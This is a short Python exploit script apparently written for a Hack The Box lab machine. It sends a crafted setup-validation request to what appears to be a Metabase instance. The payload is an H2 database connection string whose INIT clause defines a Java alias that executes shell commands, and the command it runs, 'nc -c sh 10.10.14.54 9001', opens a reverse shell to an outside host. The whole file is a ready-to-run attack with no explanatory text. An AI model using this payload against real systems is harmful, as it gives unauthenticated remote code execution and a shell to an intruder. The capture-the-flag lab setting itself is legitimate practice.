import requests
import base64
import json

URL = 'http://apethanto.htb:3000'
ENDPOINT = '/api/setup/validate'
TOKEN = '819139a8-1ce9-46f0-acf8-9b4fc0d1164b'

def exploit():
    command = 'nc -c sh 10.10.14.54 9001'

    payload = {
        "details": {
            "details": {
                "advanced-options": "true",
                "classname": "org.h2.Driver",
                "subname": "mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(new String[]{\"sh\", \"-c\", cmd})\\;}$$\\;CALL SHELLEXEC('" + command + "');",
                "subprotocol": "h2"
            },
            "engine": "postgres",
            "name": "x"
        },
        "token": TOKEN
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Connection": "close"
    }

    response = requests.post(URL + ENDPOINT, headers=headers, json=payload)
    print(response.text)

if __name__ == '__main__':
    exploit()